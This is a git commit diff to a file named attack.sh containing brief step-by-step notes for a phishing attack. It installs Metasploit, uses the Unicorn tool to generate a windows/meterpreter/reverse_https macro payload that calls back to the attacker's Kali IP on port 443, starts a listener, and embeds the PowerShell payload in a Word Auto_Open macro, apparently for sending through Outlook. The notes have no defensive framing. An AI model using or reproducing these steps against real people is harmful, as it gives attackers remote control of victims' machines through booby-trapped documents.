38c49bbdbd2f9ac44b2ccb35d3a663e926f6099a
RockAfeller2013 <428819+RockAfeller2013@users.noreply.github.com>
2025-07-17 13:45:12 +1000

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -1,11 +1,15 @@
+---------
 [UPDATE METASPL0IT]
+sudo passwd root
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erdb > msfinstall && \chmod 755 msfinstall && \ ./msfinstall
+curl -o msfinstall https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb && chmod 755 msfinstall && ./msfinstall
+
 ---------
 ---------
 ---------
-Unicorn - https://github.com/trustedsec/unicorn
-git clone https://github.com/trustedsec/unicorn
----------
+[Install Unicorn - https://github.com/trustedsec/unicorn]
+
+
 git clone https://github.com/trustedsec/unicorn
 python unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro
 sudo msfconsole -r unicorn.rc
@@ -15,6 +19,7 @@ Copy maro powershell_attack.txt into Word attachment.
 Open Word / Developer / Macros / Create / Auto_Open / insert payload .
 https://www.techtoolsforwriters.com/how-to-add-a-macro-to-word/
 ---------
+"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "CS2"
 outlook.exe /PIM "CS2"
 
 ---------
